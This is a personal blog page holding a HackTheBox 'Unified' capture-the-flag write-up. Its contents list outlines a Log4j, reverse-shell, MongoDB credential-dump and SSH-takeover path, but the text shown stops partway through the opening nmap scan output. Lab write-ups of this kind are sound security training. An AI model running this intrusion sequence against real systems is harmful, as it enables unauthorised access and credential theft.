<!DOCTYPE html>
<html lang="en-gb"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackTheBox - Unified Writeup | SH∆FIQ ∆IM∆N</title>
<meta property="og:title" content="HackTheBox - Unified Writeup | SH∆FIQ ∆IM∆N" />
<meta name="twitter:title" content="HackTheBox - Unified Writeup | SH∆FIQ ∆IM∆N" />
<meta itemprop="name" content="HackTheBox - Unified Writeup | SH∆FIQ ∆IM∆N" />
<meta name="application-name" content="HackTheBox - Unified Writeup | SH∆FIQ ∆IM∆N" />
<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />

<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />



  <meta itemprop="image" content="http://example.com" />
  <meta property="og:image" content="http://example.com" />
  <meta name="twitter:image" content="http://example.com" />
  <meta name="twitter:image:src" content="http://example.com" />




    
    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2022-02-19T00:00:00Z />
    <meta property="article:published_time" content=2022-02-19T00:00:00Z />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackTheBox - Unified Writeup",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2022-02-19",
        "description": "",
        "wordCount":  1606 ,
        "mainEntityOfPage": "True",
        "dateModified": "2022-02-19",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "SH∆FIQ ∆IM∆N"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.119.0">

    

    <link rel="canonical" href="http://example.com/posts/htb/unified/">
    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://example.com/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://example.com/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/about/">
                        About
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/tags/">
                        Tags
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/search/">
                        Search
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackTheBox - Unified Writeup</h1>
                
                
                <div class="post-meta">
                    <time datetime="2022-02-19T00:00:00&#43;00:00" itemprop="datePublished"> 19 Feb 2022 </time>
                </div>
                
            </header>
                <details class="toc">
                    <summary><b>Table of Contents</b></summary>
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#nmap">Nmap</a>
      <ul>
        <li><a href="#the-result">the result</a></li>
      </ul>
    </li>
    <li><a href="#port-8080">port 8080</a></li>
    <li><a href="#unifi---6454">unifi - 6.4.54</a></li>
    <li><a href="#exploit">exploit</a></li>
    <li><a href="#how-to-test-it-is-vulnerable-to-log4j">how to test it is vulnerable to log4j</a></li>
    <li><a href="#tcpdump">tcpdump</a></li>
    <li><a href="#rogue-jndi">Rogue JNDI</a></li>
    <li><a href="#create-a-reverse-shell-payload">create a reverse shell payload</a></li>
    <li><a href="#rogue-jndi-arguments">rogue-jndi arguments</a></li>
    <li><a href="#upgrade-shell-using-script">upgrade shell using script</a></li>
    <li><a href="#mongodb">mongoDB</a></li>
    <li><a href="#checking-mongodb-is-running">checking mongoDB is running</a></li>
    <li><a href="#dump-userpassword-from-mongodb">dump user/password from mongoDB</a></li>
    <li><a href="#change-administrator-x_shadow">change administrator x_shadow</a></li>
    <li><a href="#generate-sha-512-hash">generate sha-512 hash</a></li>
    <li><a href="#login-page">login page</a></li>
    <li><a href="#steal-ssh-creds">steal SSH creds</a></li>
    <li><a href="#ssh-as-root">ssh as root</a></li>
  </ul>
</nav>
                </details>
                <div class="page-content">
                <h2 id="nmap">Nmap</h2>
<p>As always, I&rsquo;m gonna run the Nmap scan against this machine IP address. The scan already completed. Here is the result.</p>
<h3 id="the-result">the result</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">92</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">18</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">unified</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">96</span><span class="p">.</span><span class="mi">149</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">129</span><span class="p">.</span><span class="mi">96</span><span class="p">.</span><span class="mi">149</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">22</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">996</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">tcp</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="p">(</span><span class="k">reset</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">     </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">         </span><span class="k">VERSION</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">             </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">2</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">4</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="mi">48</span><span class="p">:</span><span class="n">ad</span><span class="p">:</span><span class="n">d5</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">3</span><span class="n">a</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="n">bc</span><span class="p">:</span><span class="n">be</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">1</span><span class="n">e</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="n">bf</span><span class="p">:</span><span class="n">de</span><span class="p">:</span><span class="n">ae</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">b7</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">6</span><span class="k">c</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="n">ed</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">7</span><span class="k">c</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">1</span><span class="k">c</span><span class="p">:</span><span class="mi">1</span><span class="n">f</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">18</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="n">a6</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">a8</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="n">fb</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">6789</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ibm</span><span class="o">-</span><span class="n">db2</span><span class="o">-</span><span class="k">admin</span><span class="o">?</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="o">-</span><span class="n">proxy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">FourOhFourRequest</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">404</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">431</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">57</span><span class="w"> </span><span class="n">GMT</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">doctype</span><span class="w"> </span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">404</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Found</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span><span class="n">body</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">22</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">16</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">14</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">12</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">black</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="p">.</span><span class="n">line</span><span class="w"> </span><span class="err">{</span><span class="n">height</span><span class="p">:</span><span class="mi">1</span><span class="n">px</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="n">border</span><span class="p">:</span><span class="k">none</span><span class="p">;</span><span class="err">}</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">404</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Found</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">GetRequest</span><span class="p">,</span><span class="w"> </span><span class="n">HTTPOptions</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">302</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Location</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">manage</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">56</span><span class="w"> </span><span class="n">GMT</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">RTSPRequest</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">435</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="nb">Date</span><span class="p">:</span><span class="w"> </span><span class="n">Fri</span><span class="p">,</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">2022</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">56</span><span class="w"> </span><span class="n">GMT</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="k">Connection</span><span class="p">:</span><span class="w"> </span><span class="k">close</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="o">&lt;!</span><span class="n">doctype</span><span class="w"> </span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;&lt;</span><span class="n">style</span><span class="w"> </span><span class="k">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span><span class="n">body</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="n">family</span><span class="p">:</span><span class="n">Tahoma</span><span class="p">,</span><span class="n">Arial</span><span class="p">,</span><span class="n">sans</span><span class="o">-</span><span class="n">serif</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="p">,</span><span class="w"> </span><span class="n">h2</span><span class="p">,</span><span class="w"> </span><span class="n">h3</span><span class="p">,</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">white</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h1</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">22</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h2</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">16</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">h3</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">14</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="err">{</span><span class="n">font</span><span class="o">-</span><span class="k">size</span><span class="p">:</span><span class="mi">12</span><span class="n">px</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="err">{</span><span class="n">color</span><span class="p">:</span><span class="n">black</span><span class="p">;</span><span class="err">}</span><span class="w"> </span><span class="p">.</span><span class="n">line</span><span class="w"> </span><span class="err">{</span><span class="n">height</span><span class="p">:</span><span class="mi">1</span><span class="n">px</span><span class="p">;</span><span class="n">background</span><span class="o">-</span><span class="n">color</span><span class="p">:</span><span class="o">#</span><span class="mi">525</span><span class="n">D76</span><span class="p">;</span><span class="n">border</span><span class="p">:</span><span class="k">none</span><span class="p">;</span><span class="err">}</span><span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">HTTP</span><span class="w"> </span><span class="n">Status</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Request</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">Socks5</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="mi">400</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Type</span><span class="p">:</span><span class="w"> </span><span class="nb">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span><span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">Content</span><span class="o">-</span><span class="k">Language</span><span class="p">:</span><span class="w"> </span><span class="n">en</span><span class="w">
